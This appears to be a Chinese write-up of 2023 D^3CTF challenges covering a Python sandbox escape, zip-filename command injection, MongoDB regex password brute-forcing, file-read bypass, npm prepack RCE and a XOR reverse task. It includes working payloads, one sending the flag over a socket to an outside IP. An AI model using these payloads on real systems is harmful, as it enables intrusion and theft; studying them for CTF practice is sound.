---
title: 2023 D^3CTF writeup by 万年三等奖
contest: 2023 D^3CTF (AntCTF x D^3CTF)
year: 2023
difficulty: hard
vuln_type: [rce, sqli, web_unknown, reverse, ssrf]
tags: [D3CTF, 阿里, 蚂蚁, Escape-Plan, Python-sandbox, list-dict-substitution, d3cloud, d3node, FilesystemAdapter, zip-slip, prepack-npm, d3sky, 浮点反调试, 除零异常, XOR-ring]
attack_chain: ["WEB Escape Plan: list(dict(...))[] 切片拿 '_' 字符 + base64 payload, RCE 拿 flag", "d3cloud: admin/admin → FilesystemAdapter putFileAs → 上传 zip 自动 unzip → 文件名命令注入: 1;echo Y2F0...|base64 -d|bash;.zip", "d3node: MongoDB NoSQL regex 注入 password[$regex]='^xxx' 逐字符爆破", "PackDependencies 改 package.json prepack 命令 → 触发 npm pack", "filename[href]=[a] filename[origin]=[1] filename[protocol]=file: ... 任意文件读绕过", "REVERSE d3sky: 浮点除零异常反调试, attach 绕过, input XOR ring 还原"]
key_payload: "ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(...))"
one_liner: 2023 D^3CTF：Python list(dict()) 沙箱逃逸 + FilesystemAdapter zip 命令注入 + d3sky XOR ring
lesson: Python list(dict()) 取空字符串是经典沙箱逃逸；zip 自动解压是 RCE 经典；XOR ring 方程组是 reverse 入门
quality: high
---

# 2023 D^3CTF writeup by 万年三等奖

原文 https://www.ctfiot.com/113179.html

## WEB

### Escape Plan (Python 沙箱)
```python
import requests, base64
payload = b"""__import__('os').popen("python -c 'import socket, os; flag = os.popen(\"/readflag\").read().encode();host = \"43.143.195.203\";port=1337;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));s.sendall(flag);s.close();a=1;'").read()"""
payload = str(base64.b64encode(payload)).strip('b').strip("'") + "="

CMD = "ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict({}()))[len([])]))"
CMD = CMD.translate({ord(str(i)): u[i] for i in range(10)})
r = requests.post("http://...", data={"cmd": base64.b64encode(CMD.encode())})
```
- `list(dict(_=()))[len([])]` 拿 `_` 字符串
- `len(list(dict(aa=()))[len([])])` 是字符串 aa 长度 = 2
- `[::2]` 切片拿 'a' 字符
- 拼出 `eval(vars(eval(...))...)`

### d3cloud
- `admin/admin` 登录
- FilesystemAdapter.php 多了 `putFileAs` 函数
- 上传 zip 文件名命令注入：
  - `1;echo Y2F0...|base64 -d|bash;.zip`
  - 解压命令 `unzip -oq ... -d ...`
- 实际命令注入点

### d3node (NoSQL 注入)
```python
import requests
import string
password = ""
url = 'http://.../user/LoginIndex'
while True:
    for c in string.printable[:-6]:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            payload = {"username": "admin", "password[$regex]": '^' + password + c}
            r = requests.post(url=url, data=payload, allow_redirects=False)
            if r.status_code == 302:
                password += c
                print(password)
```
- `password[$regex]` 是 MongoDB NoSQL 注入
- 逐字符爆破

### 任意文件读
```
/dashboardIndex/ShowExampleFile?filename[href]=a&filename[origin]=1&filename[protocol]=file:&filename[hostname]=&filename[pathname]=./%2561pp.js
```
- Node.js `path.resolve` 数组绕过

### prepack RCE
```json
{"name":"y0ng-test","version":"1.0.0",
 "scripts": {"prepack":"ls > /tmp/y0"}}
```
- `PackDependencies` 执行 `npm pack`
- prepack hook 触发命令

## REVERSE

### d3sky (浮点反调试)
- 汇编有除零异常
- 浮点除零时 OS 不发信号，CPU 异常
- attach 绕过反调试
- 边调试边记录 input 处理
- input XOR ring 方程组

**还原：**
```python
enc = [0x24, 0x0B, 0x6D, 0x0F, ..., 0x33]
flag = [0] * len(enc)
flag[len(flag)-1] = 0x7E
idx = len(flag) - 1
while b"\x00" in bytes(flag):
    next_idx = (idx + 4) % len(flag)
    flag[next_idx] = flag[idx] ^ enc[idx] ^ enc[(next_idx-3) % 37]
    idx = next_idx
print(b"antd3ctf{" + bytes(flag) + b"}")
```

## 教学价值
- **Python list(dict()) 沙箱逃逸** 经典
- **NoSQL $regex 注入** 是 2017+ 流行
- **zip-slip / unzip 命令注入** 经典 web
- **filename 数组** 绕过 Node path.resolve
- **prepack npm hook** 是 npm 供应链
- **XOR ring 方程** reverse 入门
- **浮点除零反调试** 高级 reverse

## 工具
- pwntools
- pymongo regex
- 010 Editor
- jadx / frida

## 关联
- D^3CTF = AntCTF + D^3CTF（阿里 + 长亭 + DeePwn）
- 阿里蚂蚁办的国内顶级
